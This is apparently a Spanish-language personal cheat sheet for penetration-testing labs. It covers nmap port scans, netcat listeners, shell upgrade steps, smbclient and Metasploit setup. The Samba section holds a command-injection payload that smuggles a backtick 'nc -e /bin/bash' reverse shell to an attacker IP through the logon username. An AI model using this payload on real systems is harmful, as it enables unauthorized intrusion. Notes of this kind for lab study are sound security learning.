# Comandos interesantes

## NMAP

Todos los puertos, rapido y silencioso
<pre>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.168.193 -oG allPorts
</pre>
 
Puertos especificos
<pre>
nmap -sCV -p135,139,445,1688,3389,49152,49153,49154,49155,49156,49157 192.168.168.193 -oN targeted
</pre>

Puertos UDP, Los primeros 100
<pre>
nmap -sU -sCV -p1-100 192.168.168.193 -oN targetedUDP
</pre>

Especifico de vulnerabilidades sin intrusión
<pre>
nmap -p139,445 --script="Vuln and Safe" 192.168.168.193 -oN vulnScan 
</pre>
## Netcap

Ponernos a la escucha:

<pre>
nc -nlvp 443
</pre>

Si es windows:

<pre>
rlwrap nc -nlvp 444
</pre>

Si es Linux podemos tunear la terminal recibida:

<pre>
scrip /dev/null -c bash
# CTLR + Z para poner en segundo plano la terminal
stty raw -echo; fg
reset xterm
export TERM=xterm
export shell=bash
stty rows 51 columns 189

</pre>

## Samba
Listar recursos:
<pre>
smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"
</pre>

Conectarnos a un recurso y ejecutar comando:
<pre>
smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.32 443`"'
</pre>

lo subimos por el ftp anonimo y a la escucha con:

<pre>
nc -nlvp 443
</pre>

Fijarse bien en la IP que conecta.


## Metasploit

### Iniciar la primera vez

Arrancamos servicio de base de datos
<pre>
sudo service postgresql start
</pre>

Inicamos bbdd de metasploit

<pre>
sudo msfdb init
</pre>

Despues como siempre

<pre>
msfconsole
</pre>
